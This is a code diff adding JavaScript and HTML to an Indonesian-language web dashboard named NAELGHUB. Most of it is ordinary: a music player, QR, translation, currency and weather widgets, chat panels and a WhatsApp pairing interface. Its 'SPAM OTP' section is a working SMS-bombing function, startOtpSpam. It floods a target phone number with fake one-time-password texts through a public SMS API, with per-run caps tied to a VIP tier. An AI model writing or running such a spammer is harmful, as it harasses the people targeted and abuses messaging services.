+  if(vc){ vc.addEventListener('input',()=>{audio.volume=Number(vc.value)/100;if(vv)vv.textContent=vc.value+'%';}); }
+  audio.addEventListener('play',()=>{isPlaying=true;const b=document.getElementById('playBtn');if(b)b.innerHTML='<i class="fas fa-pause"></i>';});
+  audio.addEventListener('pause',()=>{isPlaying=false;const b=document.getElementById('playBtn');if(b)b.innerHTML='<i class="fas fa-play"></i>';});
+  audio.addEventListener('ended',()=>nextSong());
+  audio.addEventListener('error',()=>{
+    // If a remote API track fails, fall back to bundled originals.
+    if(songs.length && !songs.every(x=>LOCAL_SONGS.some(l=>l.file===x.file))){
+      songs=LOCAL_SONGS.slice(); currentSongIndex=0; renderSongList(); updateNowPlaying();
+      if(typeof showToast==='function')showToast('🎵 Beralih ke musik bawaan');
+    }
+  });
+}
+function renderSongList(){
+  const c=document.getElementById('songList'); if(!c)return;
+  c.innerHTML=songs.map((s,i)=>`<div onclick="selectSong(${i})" style="display:flex;gap:8px;padding:8px 12px;border-radius:8px;cursor:pointer;${i===currentSongIndex?'background:rgba(255,23,68,.1);':''}"><div style="flex:1;"><div style="font-size:12px;">${escapeHtml(s.title)}</div><div style="font-size:9px;color:var(--text-secondary);">${escapeHtml(s.artist)}</div></div><span style="font-size:9px;color:var(--text-secondary);">${s.duration}</span></div>`).join('');
+}
+function escapeHtml(v){return String(v).replace(/[&<>'"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[c]));}
+function updateNowPlaying(){
+  const s=songs[currentSongIndex]; if(!s)return;
+  const npt=document.getElementById('nowPlayingTitle'),npa=document.getElementById('nowPlayingArtist');
+  if(npt)npt.textContent=s.title;if(npa)npa.textContent=s.artist;
+}
+function selectSong(i){
+  if(!songs.length||!songs[i]||!audio)return;
+  currentSongIndex=i; audio.src=songs[i].file; audio.load(); updateNowPlaying(); renderSongList();
+  const da=document.getElementById('nxDashAudio'); if(da){ da.src=songs[i].file; da.load(); }
+  const nt=document.getElementById('nxMusicTitle'),na=document.getElementById('nxMusicArtist'); if(nt)nt.textContent=songs[i].title;if(na)na.textContent=songs[i].artist;
+  loadNoxxaLyrics(songs[i].title,songs[i].artist);
+  audio.play().catch(()=>{if(typeof showToast==='function')showToast('Tekan Play untuk memulai musik');});
+  if(da) da.play().catch(()=>{});
+}
+function togglePlay(){
+  if(!audio||!songs.length)return;
+  if(!audio.src)selectSong(currentSongIndex);else if(isPlaying)audio.pause();else audio.play().catch(()=>{});
+}
+function nextSong(){if(!songs.length)return;currentSongIndex=(currentSongIndex+1)%songs.length;selectSong(currentSongIndex);}
+function prevSong(){if(!songs.length)return;currentSongIndex=(currentSongIndex-1+songs.length)%songs.length;selectSong(currentSongIndex);}
+
+/* ============ SPAM OTP ============ */
+let otpRunning = false;
+function startOtpSpam(){
+  if(otpRunning) return;
+  const t = document.getElementById('otpTarget').value.trim();
+  let c = parseInt(document.getElementById('otpCount').value);
+  const max = hasVIP() ? 50 : 5; if(c > max) c = max;
+  const log = document.getElementById('otpLog'); if(log) log.innerHTML = '';
+  let s = 0, f = 0; otpRunning = true;
+  function kirim(){
+    if(s + f >= c){ otpRunning = false; if(log) log.innerHTML += `Done: ${s}/${c}`; return; }
+    const otp = Math.floor(100000 + Math.random() * 900000);
+    fetch('https://textbelt.com/text', {
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body: `phone=${encodeURIComponent(t.replace(/\s/g,''))}&message=${encodeURIComponent('OTP: '+otp)}&key=textbelt`
+    }).then(r=>r.json()).then(d=>{
+      if(d.success){ s++; if(log) log.innerHTML += `✅ ${otp}\n`; }
+      else { f++; if(log) log.innerHTML += `❌ ${d.error}\n`; }
+      setTimeout(kirim, 500);
+    });
+  }
+  kirim();
+}
+
+/* ============ HISTORY ============ */
+function addHistory(s, d){
+  const h = getHistory();
+  const n = new Date();
+  h.unshift({ status: s, desc: d, time: n.toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'}), date: n.toLocaleDateString('id-ID',{day:'2-digit',month:'short'}) });
+  if(h.length > 50) h.pop();
+  saveHistory(h); renderHistory();
+}
+function renderHistory(){
+  const c = document.getElementById('historyList'); if(!c) return;
+  const h = getHistory();
+  if(h.length === 0){ c.innerHTML = '<div style="text-align:center;padding:16px;color:var(--text-secondary);font-size:12px;">Belum ada history</div>'; return; }
+  c.innerHTML = h.map(i=>`<div style="padding:8px 12px;background:rgba(255,23,68,.04);border-radius:8px;border-left:3px solid ${i.status==='success'?'#00e676':'#ff1744'}"><div style="font-size:12px;">${i.desc}</div><div style="font-size:9px;color:var(--text-secondary);">${i.date} • ${i.time}</div></div>`).join('');
+}
+function loadHistory(){
+  if(getHistory().length === 0) addHistory('success', 'Login');
+  else renderHistory();
+}
+
+/* ============ SETTINGS ============ */
+function loadSettings(){
+  const a = localStorage.getItem('naelghub_accent') || '#ff1744';
+  changeAccent(a, true);
+  const s = document.getElementById('accentSelect'); if(s) s.value = a;
+  const k = getNumverifyKey();
+  const e = document.getElementById('numverifyApiKey'); if(e) e.value = k;
+}
+function changeAccent(c, s=false){
+  document.documentElement.style.setProperty('--accent', c);
+  document.documentElement.style.setProperty('--accent-glow', c + '55');
+  localStorage.setItem('naelghub_accent', c);
+  if(!s) showToast('🎨 Changed');
+}
+function saveNumverifyKey(){
+  const k = document.getElementById('numverifyApiKey').value.trim();
+  localStorage.setItem('naelghub_numverify_key', k);
+  showToast('✅ Saved');
+}
+
+/* ============ MULTI API FUNCTIONS ============ */
+function genQR(){
+  const text = document.getElementById('qrText').value.trim();
+  const res = document.getElementById('qrResult');
+  if(!text){ res.className='api-result error'; res.textContent='❌ Masukkan teks!'; return; }
+  const url = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(text);
+  res.className = 'api-result success';
+  res.innerHTML = `<div style="text-align:center;"><img src="${url}" style="background:#fff;padding:8px;border-radius:8px;max-width:200px;" /><div style="margin-top:8px;font-size:10px;">✅ QR: ${escapeHtml(text)}</div></div>`;
+}
+async function shortenUrl(){
+  const url = document.getElementById('shortUrl').value.trim();
+  const res = document.getElementById('shortResult');
+  if(!url){ res.className='api-result error'; res.textContent='❌ Masukkan URL!'; return; }
+  res.className = 'api-result'; res.textContent = '⏳ Shortening...';
+  try {
+    const r = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
+    const d = await r.json();
+    if(d.shorturl){ res.className = 'api-result success'; res.innerHTML = `✅ Short URL:\n<a href="${d.shorturl}" target="_blank" style="color:#4a90d9;">${d.shorturl}</a>`; }
+    else throw new Error(d.errormessage || 'Failed');
+  } catch(e){ res.className='api-result error'; res.textContent = '❌ ' + e.message; }
+}
+async function translateText(){
+  const text = document.getElementById('translateText').value.trim();
+  const to = document.getElementById('translateTo').value;
+  const res = document.getElementById('translateResult');
+  if(!text){ res.className='api-result error'; res.textContent='❌ Masukkan teks!'; return; }
+  res.className = 'api-result'; res.textContent = '⏳ Translating...';
+  try {
+    const r = await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=id|${to}`);
+    const d = await r.json();
+    const translated = d.responseData?.translatedText || 'Gagal';
+    res.className = 'api-result success';
+    res.innerHTML = `📝 Original: ${escapeHtml(text)}\n🌐 Translated: <b style="color:#00e676;">${escapeHtml(translated)}</b>`;
+  } catch(e){ res.className='api-result error'; res.textContent = '❌ ' + e.message; }
+}
+async function convertCurrency(){
+  const amount = parseFloat(document.getElementById('currAmount').value) || 0;
+  const from = document.getElementById('currFrom').value;
+  const to = document.getElementById('currTo').value;
+  const res = document.getElementById('currResult');
+  res.className = 'api-result'; res.textContent = '⏳ Converting...';
+  try {
+    const r = await fetch(`https://api.exchangerate-api.com/v4/latest/${from}`);
+    const d = await r.json();
+    const rate = d.rates?.[to];
+    if(!rate) throw new Error('Rate not found');
+    const converted = (amount * rate).toFixed(2);
+    res.className = 'api-result success';
+    res.innerHTML = `💱 ${amount} ${from} = <b style="color:#00e676;">${converted} ${to}</b>`;
+  } catch(e){ res.className='api-result error'; res.textContent = '❌ ' + e.message; }
+}
+async function getGitHub(){
+  const u = document.getElementById('ghUser').value.trim();
+  const res = document.getElementById('ghResult');
+  if(!u){ res.className='api-result error'; res.textContent='❌ Masukkan username!'; return; }
+  res.className = 'api-result'; res.textContent = '⏳ Searching...';
+  try {
+    const r = await fetch(`https://api.github.com/users/${encodeURIComponent(u)}`);
+    if(!r.ok) throw new Error('User not found');
+    const d = await r.json();
+    res.className = 'api-result success';
+    res.innerHTML = `👤 <b>${d.login}</b> (${d.name || '-'})\n📝 Bio: ${d.bio || '-'}\n👥 Followers: ${d.followers}\n📦 Repos: ${d.public_repos}\n🔗 ${d.html_url}`;
+  } catch(e){ res.className='api-result error'; res.textContent = '❌ ' + e.message; }
+}
+async function getRandomUser(){
+  const res = document.getElementById('userResult');
+  res.className = 'api-result'; res.textContent = '⏳ Generating...';
+  try {
+    const r = await fetch('https://randomuser.me/api/');
+    const d = await r.json();
+    const u = d.results[0];
+    res.className = 'api-result success';
+    res.innerHTML = `👤 <b>${u.name.first} ${u.name.last}</b>\n📧 ${u.email}\n📱 ${u.phone}\n🌍 ${u.location.country}`;
+  } catch(e){ res.className='api-result error'; res.textContent = '❌ ' + e.message; }
+}
+async function getJoke(){
+  const res = document.getElementById('jokeResult');
+  res.className = 'api-result'; res.textContent = '⏳ Loading...';
+  try {
+    const r = await fetch('https://official-joke-api.appspot.com/random_joke');
+    const d = await r.json();
+    res.className = 'api-result success';
+    res.innerHTML = `😂 <b>${d.setup}</b>\n\n😆 ${d.punchline}`;
+  } catch(e){ res.className='api-result error'; res.textContent = '❌ ' + e.message; }
+}
+
+/* ============ WEATHER + IP ============ */
+async function loadWeather(){
+  try {
+    const ipResp = await fetch('https://ipapi.co/json/');
+    const ipData = await ipResp.json();
+    const lat = ipData.latitude || -6.2, lon = ipData.longitude || 106.8, city = ipData.city || 'Jakarta';
+    const wResp = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,weather_code,relative_humidity_2m&timezone=auto`);
+    const wData = await wResp.json();
+    const temp = Math.round(wData.current?.temperature_2m || 30);
+    const humidity = wData.current?.relative_humidity_2m || 0;
+    const code = wData.current?.weather_code || 0;
+    const icons = {0:'fa-sun',1:'fa-cloud-sun',2:'fa-cloud-sun',3:'fa-cloud',45:'fa-smog',48:'fa-smog',51:'fa-cloud-rain',61:'fa-cloud-showers-heavy',71:'fa-snowflake',80:'fa-cloud-showers-heavy',95:'fa-bolt'};
+    const icon = icons[code] || 'fa-cloud-sun';
+    const wv = document.getElementById('weatherValue'); if(wv) wv.textContent = temp + '°C';
+    const ws = document.getElementById('weatherSub'); if(ws) ws.textContent = `${city} · 💧${humidity}%`;
+    const wi = document.getElementById('weatherIcon'); if(wi) wi.className = 'fas ' + icon;
+  } catch(e){
+    const wv = document.getElementById('weatherValue'); if(wv) wv.textContent = '--°C';
+    const ws = document.getElementById('weatherSub'); if(ws) ws.textContent = 'Gagal load';
+  }
+}
+function getPreciseGPS(){
+  const loc=document.getElementById('ipLocation'), det=document.getElementById('ipDetail'), btn=document.getElementById('gpsLocationBtn');
+  if(!navigator.geolocation){ if(loc)loc.textContent='GPS tidak didukung'; if(det)det.textContent='Browser tidak menyediakan navigator.geolocation'; return; }
+  if(btn){btn.disabled=true;btn.textContent='🛰️ Mengambil GPS...';}
+  if(loc)loc.textContent='Mencari posisi...'; if(det)det.textContent='Izinkan akses lokasi perangkat jika diminta';
+  navigator.geolocation.getCurrentPosition(position=>{
+    const {latitude,longitude,accuracy}=position.coords;
+    if(loc)loc.textContent=`${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+    if(det)det.textContent=`Akurasi ±${Math.round(accuracy)} m · GPS perangkat`;
+    try{localStorage.setItem('nael_gps',JSON.stringify({latitude,longitude,accuracy,timestamp:Date.now()}));}catch{}
+    if(btn){btn.disabled=false;btn.textContent='🔄 Perbarui Lokasi GPS';}
+  },error=>{
+    const msg={1:'Izin lokasi ditolak. Aktifkan izin lokasi untuk situs ini.',2:'Posisi tidak tersedia. Pastikan GPS/lokasi perangkat aktif.',3:'GPS timeout. Coba lagi.'};
+    if(loc)loc.textContent='Lokasi belum tersedia'; if(det)det.textContent=msg[error.code]||'Gagal mendapatkan lokasi GPS';
+    if(btn){btn.disabled=false;btn.textContent='📍 Coba Lagi';}
+  },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+}
+function loadIPInfo(){
+  try{const saved=JSON.parse(localStorage.getItem('nael_gps')||'null'); if(saved&&Number.isFinite(saved.latitude)&&Number.isFinite(saved.longitude)){
+    const loc=document.getElementById('ipLocation'),det=document.getElementById('ipDetail');
+    if(loc)loc.textContent=`${saved.latitude.toFixed(6)}, ${saved.longitude.toFixed(6)}`;
+    if(det)det.textContent=`Akurasi ±${Math.round(saved.accuracy||0)} m · GPS tersimpan`;
+  }}catch{}
+}console.log('🔥 dashboard.html loaded — NAELGHUB v14.1 FIXED');
+
+/* ===== NAELGHUB UPDATE: INTRO + GLOBAL/PRIVATE REALTIME + PAIRING + WORLDWIDE MUSIC ===== */
+
+/* ===== FIX: PRIVATE + PAIRING PANELS ===== */
+function updatePrivatePanelStatus(){
+  const el=document.getElementById('privateFirebaseStatus');
+  if(el) el.textContent = fbDB ? '● Firebase terhubung' : '● Firebase belum terhubung';
+}
+async function requestPairingCode2(){
+  const out=document.getElementById('pairingResult2'), btn=document.getElementById('pairingBtn2');
+  const load=document.getElementById('pairLoader2'), box=document.getElementById('pairCodeBox2'), code=document.getElementById('pairCode2');
+  const phone=(document.getElementById('pairPhone2')?.value||'').replace(/\D/g,'');
+  const base=String(getBackendUrl()||window.NAELGHUB_API_BASE||'').replace(/\/$/,'');
+  if(phone.length<10){if(out)out.textContent='❌ Nomor tidak valid. Gunakan format 628xxxxxxxxxx.';return;}
+  if(!base){if(out)out.textContent='❌ Backend URL belum diatur. Buka Settings → Backend URL.';return;}
+  if(btn)btn.disabled=true;if(load)load.hidden=false;if(box)box.hidden=true;
+  if(out)out.textContent='';
+  try{
+    const r=await fetch(base+'/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone}),cache:'no-store'});
+    const d=await r.json().catch(()=>({}));
+    if(!r.ok||!d.code) throw new Error(d.error||d.message||('HTTP '+r.status));
+    if(code)code.textContent=d.code;
+    if(box)box.hidden=false;
+    if(out)out.textContent='✅ Pairing code asli berhasil dibuat oleh backend WhatsApp. Masukkan kode di WhatsApp → Perangkat tertaut → Tautkan perangkat dengan nomor telepon.';
+    setPairStatus2('🟡 Kode dibuat — menunggu WhatsApp terhubung…',true);
+    // Pantau status koneksi secara realtime selama proses pairing.
+    clearInterval(window.__noxxaPairPoll);
+    let attempts=0;
+    window.__noxxaPairPoll=setInterval(async()=>{
+      attempts++;
+      await checkPairingStatus2();
+      const status=(document.getElementById('pairStatus2')?.textContent||'');
+      if(status.includes('WhatsApp terhubung') || attempts>=30){
+        clearInterval(window.__noxxaPairPoll);
+        window.__noxxaPairPoll=null;
+      }
+    },2000);
+  }catch(e){
+    if(out)out.textContent='❌ '+e.message;
+    setPairStatus2('🔴 Gagal terhubung ke backend',false);
+  }finally{
+    if(btn)btn.disabled=false;if(load)load.hidden=true;
+  }
+}
+async function checkPairingStatus2(){
+  const base=String(getBackendUrl()||window.NAELGHUB_API_BASE||'').replace(/\/$/,'');
+  if(!base){setPairStatus2('🟠 Backend URL belum diatur',false);return;}
+  try{
+    const r=await fetch(base+'/api/status',{cache:'no-store',signal:AbortSignal.timeout(6000)});
+    const d=await r.json();
+    setPairStatus2(d.connected?('🟢 WhatsApp terhubung'+(d.number?' · '+d.number:'')):'🟡 Backend siap — menunggu pairing',!!d.connected);
+  }catch(e){setPairStatus2('🔴 Backend Node.js belum terhubung',false);}
+}
+function setPairStatus2(text,ok){
+  const el=document.getElementById('pairStatus2'),dot=document.getElementById('pairDot2');
+  if(el)el.textContent=text;
+  if(dot)dot.style.background=ok?'#2cff9a':'#ff4d6d';
+}
+async function copyPairCode2(){
+  const code=document.getElementById('pairCode2')?.textContent||'';
+  if(!code||code==='--------')return;
+  try{await navigator.clipboard.writeText(code);showToast('✅ Pairing code disalin');}
+  catch{showToast('⚠️ Tidak bisa menyalin otomatis');}
+}
+
+let privateRoom = null, privateListener = null;
+function roomKey(a,b){return [String(a).trim().toLowerCase(),String(b).trim().toLowerCase()].sort().join('__').replace(/[^a-z0-9_\-]/g,'_');}
+function renderRealtimeMessages(containerId, data){const c=document.getElementById(containerId);if(!c)return;const arr=Object.values(data||{}).sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));c.innerHTML=arr.length?arr.map(m=>`<div class="chat-message ${window.currentUser&&m.username===window.currentUser.username?'self':''}"><div class="avatar">${(m.username||'?')[0].toUpperCase()}</div><div class="body"><div class="msg-head"><span class="msg-user">${escapeHtml(m.username||'?')}</span><span class="msg-time">${escapeHtml(m.time||'')}</span></div><div class="msg-text">${escapeHtml(m.message||'')}</div></div></div>`).join(''):'<div style="text-align:center;padding:20px;color:var(--text-secondary)">Belum ada pesan.</div>';c.scrollTop=c.scrollHeight;}
+function openPrivateRoom(){
+  const target=(document.getElementById('privateUser')?.value||'').trim();
+  if(!target)return showToast('⚠️ Masukkan username tujuan');
+  if(!window.currentUser)return showToast('⚠️ Sesi login belum siap');
+  if(!fbDB){updatePrivatePanelStatus();return showToast('⚠️ Firebase belum connect');}
+  if(target.toLowerCase()===String(window.currentUser.username||'').toLowerCase())return showToast('⚠️ Gunakan username lain');
+  privateRoom=roomKey(window.currentUser.username,target);
+  const label=document.getElementById('privateRoomLabel');if(label)label.textContent='Room private: '+target;
+  if(privateListener)try{fbDB.ref('private/'+privateRoom).off('value',privateListener);}catch{}
+  privateListener=fbDB.ref('private/'+privateRoom).limitToLast(100).on('value',snap=>renderRealtimeMessages('privateMessages',snap.val()),err=>showToast('❌ '+err.message));
+}
+function sendPrivateMessage(){
+  const i=document.getElementById('privateInput'),msg=i?.value.trim();
+  if(!msg)return;
+  if(!privateRoom)return showToast('⚠️ Buka room private dulu');
+  if(!fbDB)return showToast('⚠️ Firebase belum connect');
+  fbDB.ref('private/'+privateRoom).push({
+    username:window.currentUser.username,role:window.currentUser.role||'member',message:msg,
+    time:new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'}),timestamp:Date.now()
+  }).then(()=>{i.value='';}).catch(e=>showToast('❌ '+e.message));
+}
+async function requestPairingCode(){const out=document.getElementById('pairResult'), phone=document.getElementById('pairPhone')?.value.trim();const base=getBackendUrl();if(!base)return out.textContent='❌ Backend URL belum diatur.';if(!phone)return out.textContent='❌ Masukkan nomor WhatsApp.';out.textContent='⏳ Meminta pairing code...';try{const r=await fetch(base+'/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Pairing gagal');out.textContent='✅ Pairing code: '+(d.code||'-')+'\nNomor: '+(d.phone||phone)+'\n\nMasukkan kode ini di WhatsApp pada perangkat yang ingin ditautkan.';}catch(e){out.textContent='❌ '+e.message;}}
+async function searchWorldwideMusic(){const q=document.getElementById('musicSearch')?.value.trim();const list=document.getElementById('songList');if(!q)return;if(list)list.innerHTML='<div style="padding:12px;color:var(--text-secondary)">⏳ Mencari katalog musik global...</div>';try{const r=await fetch('https://itunes.apple.com/search?term='+encodeURIComponent(q)+'&media=music&entity=song&limit=50');const d=await r.json();const tracks=d.results||[];if(!tracks.length){list.innerHTML='<div style="padding:12px">Tidak ditemukan.</div>';return;}list.innerHTML=tracks.map((t,i)=>`<button onclick="playWorldwide(${i})" style="text-align:left;padding:10px;border:1px solid #ffffff10;border-radius:10px;background:#ffffff05;color:#fff;cursor:pointer"><b>${escapeHtml(t.trackName||'Unknown')}</b><br><span style="font-size:11px;color:var(--text-secondary)">${escapeHtml(t.artistName||'Unknown')} · ${escapeHtml(t.collectionName||'')}</span></button>`).join('');window.worldwideTracks=tracks;}catch(e){list.innerHTML='<div style="padding:12px;color:#ff6b6b">❌ '+escapeHtml(e.message)+'</div>';}}
+function playWorldwide(i){const t=(window.worldwideTracks||[])[i];if(!t)return;const a=document.getElementById('audioPlayer');a.src=t.previewUrl||'';document.getElementById('nowPlayingTitle').textContent=t.trackName||'Unknown';document.getElementById('nowPlayingArtist').textContent=t.artistName||'Unknown';if(a.src)a.play().catch(()=>{});}
+</script>
+
+<section id="nael-global-chat" class="nael-standalone-hidden" style="margin:24px 0;padding:18px;border-radius:18px;background:rgba(12,16,28,.88);border:1px solid rgba(255,255,255,.12)">
+  <h2 style="margin:0 0 8px">🌐 Chat Global</h2>
+  <p style="margin:0 0 14px;opacity:.7">Chat antar pengguna secara realtime. Ini terpisah dari sendBug().</p>
+  <div id="globalMessages" style="height:260px;overflow:auto;padding:10px;border-radius:12px;background:#0005"></div>
+  <div style="display:flex;gap:8px;margin-top:10px">
+    <input id="globalChatInput" type="text" placeholder="Tulis pesan..." style="flex:1;padding:12px;border-radius:10px;border:1px solid #ffffff22;background:#111827;color:#fff">
+    <button id="globalChatSend" type="button" style="padding:12px 16px;border:0;border-radius:10px;cursor:pointer">Kirim</button>
+  </div>
+</section>
+<script>
+(function(){
+  const box=document.getElementById('globalMessages');
+  const input=document.getElementById('globalChatInput');
+  const send=document.getElementById('globalChatSend');
+  if(!box||!input||!send) return;
+  const key='naelghub_global_chat';
+  function render(){
+    let msgs=[];
+    try{ msgs=JSON.parse(localStorage.getItem(key)||'[]'); }catch{}
+    box.innerHTML=msgs.slice(-100).map(m =>
+      '<div style="margin:6px 0"><b>'+escapeHtml(m.user)+'</b>: '+escapeHtml(m.text)+'</div>'
+    ).join('');
+    box.scrollTop=box.scrollHeight;
+  }
+  function escapeHtml(v){
+    return String(v).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c]));
+  }
+  function sendMsg(){
+    const text=input.value.trim();
+    if(!text) return;
+    const session=JSON.parse(localStorage.getItem('naelghub_session')||'null');
+    let msgs=[];
+    try{ msgs=JSON.parse(localStorage.getItem(key)||'[]'); }catch{}
+    msgs.push({user:session?.username||'User',text,time:Date.now()});
+    localStorage.setItem(key,JSON.stringify(msgs.slice(-100)));
+    input.value='';
+    render();
+  }
+  send.onclick=sendMsg;
+  input.addEventListener('keydown',e=>{if(e.key==='Enter')sendMsg();});
+  window.addEventListener('storage',e=>{if(e.key===key)render();});
+  render();
+})();
+</script>
+
+
+<!-- NAELGHUB_PAIRING_UI_V4 -->
+<section id="naelPairingCode" class="nael-standalone-hidden" style="margin:20px 0;padding:20px;border-radius:22px;background:linear-gradient(145deg,#101626,#070a14);border:1px solid #00d4ff2d;color:#fff;box-shadow:0 18px 50px #0007">
+<div style="display:flex;align-items:center;gap:12px"><div style="font-size:28px">🔗</div><div><h2 style="margin:0">WhatsApp Pairing</h2><p style="margin:4px 0;opacity:.6;font-size:13px">Hubungkan WhatsApp dengan pairing code.</p></div><i id="pairDot" style="margin-left:auto;width:10px;height:10px;border-radius:50%;background:#777"></i></div>
+<div id="pairStatus" style="margin:16px 0;padding:11px;border-radius:12px;background:#0005;font-size:13px">Memeriksa server…</div>
+<div style="display:flex;gap:9px"><input id="pairingPhone" inputmode="tel" placeholder="628xxxxxxxxxx" style="flex:1;min-width:0;padding:13px;border-radius:12px;border:1px solid #ffffff18;background:#090d17;color:#fff"><button id="pairingBtn" type="button" style="border:0;border-radius:12px;padding:0 16px;font-weight:800;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff">GET CODE</button></div>
+<div id="pairLoader" hidden style="text-align:center;margin-top:15px;padding:13px">◌ Menghubungkan…</div>
+<div id="pairCodeBox" hidden style="margin-top:15px;text-align:center;padding:18px;border-radius:16px;background:#00d4ff0d"><small>PAIRING CODE</small><strong id="pairCode" style="display:block;font:900 30px monospace;letter-spacing:5px;margin:9px">--------</strong><button id="pairCopy" type="button">SALIN CODE</button></div>
+<pre id="pairingResult" style="white-space:pre-wrap;opacity:.7;font-size:12px"></pre>
+</section>
+<style>
+#pairLoader{animation:pairPulse 1s infinite}@keyframes pairPulse{50%{opacity:.35}}
+</style>
+<script>
+(()=>{const B=(window.NAELGHUB_API_BASE||'').replace(/\/$/,''),q=id=>document.getElementById(id),btn=q('pairingBtn'),ph=q('pairingPhone'),out=q('pairingResult'),st=q('pairStatus'),dot=q('pairDot'),load=q('pairLoader'),box=q('pairCodeBox'),code=q('pairCode'),cp=q('pairCopy');if(!btn)return;
+const check=async()=>{try{let r=await fetch(B+'/api/status',{cache:'no-store'}),d=await r.json();if(d.connected){st.textContent='🟢 WhatsApp terhubung';dot.style.background='#2cff9a'}else{st.textContent='🟡 Server siap — menunggu pairing';dot.style.background='#ffc857'}}catch(e){st.textContent='🔴 Backend Node.js belum terhubung';dot.style.background='#ff4d6d'}};
+const get=async()=>{let n=ph.value.replace(/\D/g,'');if(n.length<10){out.textContent='Nomor tidak valid.';return}btn.disabled=true;load.hidden=false;box.hidden=true;try{let r=await fetch(B+'/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:n})}),d=await r.json().catch(()=>({}));if(!r.ok||!d.code){out.textContent='❌ '+(d.error||d.message||('HTTP '+r.status));return}code.textContent=d.code;box.hidden=false;out.textContent='Masukkan code pada proses WhatsApp Linked Devices.';let i=0,t=setInterval(async()=>{await check();if(++i>=20)clearInterval(t)},3000)}catch(e){out.textContent='❌ Backend pairing tidak dapat dihubungi.'}finally{btn.disabled=false;load.hidden=true}};btn.onclick=get;ph.onkeydown=e=>{if(e.key==='Enter')get()};cp.onclick=()=>{navigator.clipboard?.writeText(code.textContent);cp.textContent='TERSALIN';setTimeout(()=>cp.textContent='SALIN CODE',1200)};check();setInterval(check,10000)})()
+</script>
+
+
+<!-- NAELGHUB_SPOTIFY_V1 -->
+<section id="naelSpotify" class="nael-standalone-hidden" style="margin:20px 0;padding:20px;border-radius:22px;background:linear-gradient(145deg,#101626,#070a14);border:1px solid #1ed76035;color:#fff">
+  <div style="display:flex;align-items:center;gap:12px">
+    <div style="font-size:28px">🎵</div>
+    <div><h2 style="margin:0">Music Worldwide</h2><p style="margin:4px 0;opacity:.6;font-size:13px">Cari katalog Spotify dan buka lagu langsung di Spotify.</p></div>
+  </div>
+  <div style="display:flex;gap:9px;margin-top:16px">
+    <input id="spotifySearch" placeholder="Cari lagu, artis, album..."
+      style="flex:1;padding:13px;border-radius:12px;border:1px solid #ffffff18;background:#090d17;color:#fff">
+    <button id="spotifySearchBtn" type="button"
+      style="border:0;border-radius:12px;padding:0 16px;font-weight:800;background:#1ed760;color:#06130a">CARI</button>
+  </div>
+  <div id="spotifyResults" style="margin-top:14px;display:grid;gap:10px"></div>
+  <div id="spotifyHint" style="margin-top:12px;font-size:12px;opacity:.55">
+    Spotify API membutuhkan OAuth. Client secret jangan diletakkan di HTML.
+  </div>
+</section>
+<script>
+(()=> {
+  const q=document.getElementById('spotifySearch'), b=document.getElementById('spotifySearchBtn');
+  const box=document.getElementById('spotifyResults');
+  if(!q||!b) return;
+  async function search(){
+    const term=q.value.trim(); if(!term) return;
+    box.innerHTML='<div style="opacity:.65">Mencari di Spotify…</div>';
+    try{
+      const r=await fetch('/api/spotify/search?q='+encodeURIComponent(term));
+      const d=await r.json();
+      if(!r.ok) throw new Error(d.error||'Spotify API error');
+      const items=d.tracks?.items||[];
+      if(!items.length){box.innerHTML='<div style="opacity:.65">Tidak ada hasil.</div>';return}
+      box.innerHTML=items.map(t=>{
+        const img=t.album?.images?.[2]?.url||t.album?.images?.[0]?.url||'';
+        const url=t.external_urls?.spotify||'#';
+        const artists=(t.artists||[]).map(a=>a.name).join(', ');
+        return `<article style="display:flex;gap:12px;align-items:center;padding:10px;border-radius:14px;background:#ffffff08">
+          ${img?`<img src="${img}" width="54" height="54" style="border-radius:9px;object-fit:cover">`:''}
+          <div style="flex:1;min-width:0"><b>${esc(t.name)}</b><div style="opacity:.6;font-size:12px">${esc(artists)}</div></div>
+          <a href="${url}" target="_blank" rel="noopener" style="text-decoration:none;padding:9px 12px;border-radius:10px;background:#1ed760;color:#06130a;font-weight:800">BUKA</a>
+        </article>`;
+      }).join('');
+    }catch(e){
+      box.innerHTML='<div style="opacity:.7">Spotify belum dikonfigurasi di backend.</div>';
+    }
+  }
+  function esc(v){return String(v).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c]))}
+  b.onclick=search;q.onkeydown=e=>{if(e.key==='Enter')search()};
+})();
+</script>
+
+<script>
+/* ===== NAELGHUB LIVE UI FIX v15 ===== */
+(function(){
+  const $=id=>document.getElementById(id);
+  window.loadUiPreferences=function(){
+    const lang=localStorage.getItem('nael_language')||'id';
+    const bg=localStorage.getItem('nael_background')||'normal';
+    const ls=$('languageSelect'), bs=$('backgroundSelect');
+    if(ls) ls.value=lang; if(bs) bs.value=bg;
+    window.changeDashboardBackground(bg);
+  };
+  window.changeLanguage=function(lang){
+    localStorage.setItem('nael_language',lang);
+    document.documentElement.lang=lang;
+    if(typeof showToast==='function') showToast(lang==='en'?'Language: English':'Bahasa: Indonesia');
+  };
+  window.changeDashboardBackground=function(mode){
+    localStorage.setItem('nael_background',mode);
+    const app=$('app'), video=$('dashboardBgVideo'), source=$('dashboardBgSource');
+    if(!app||!video||!source)return;
+    app.classList.toggle('comic-theme',mode==='comic');
+    let file = mode==='scary' ? 'VID-20260802-WA0079.mp4' : 'tiktokio.com1789904488_quPNz2ugt0suf7KUcFIS.mp4';
